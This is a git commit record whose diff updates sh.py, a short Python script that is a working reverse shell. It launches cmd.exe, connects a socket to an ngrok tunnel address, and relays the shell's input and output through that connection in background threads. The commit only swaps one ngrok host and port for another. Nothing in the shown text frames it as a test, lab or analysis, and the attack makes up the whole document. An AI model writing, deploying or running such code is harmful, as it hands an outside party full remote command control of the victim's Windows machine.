cc90ec5d6b2151bbc4c9370950c7d1b985683470
Omar Samy <osamy7592@gmail.com>
2024-05-01 07:06:35 +0300

    Update sh.py

--- sh.py
+++ sh.py
@@ -1,6 +1,6 @@
 import socket,os,threading,subprocess as sp
 p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
 s=socket.socket()
-s.connect(('7.tcp.eu.ngrok.io',18350))
+s.connect(('4.tcp.eu.ngrok.io',11261))
 threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
 threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
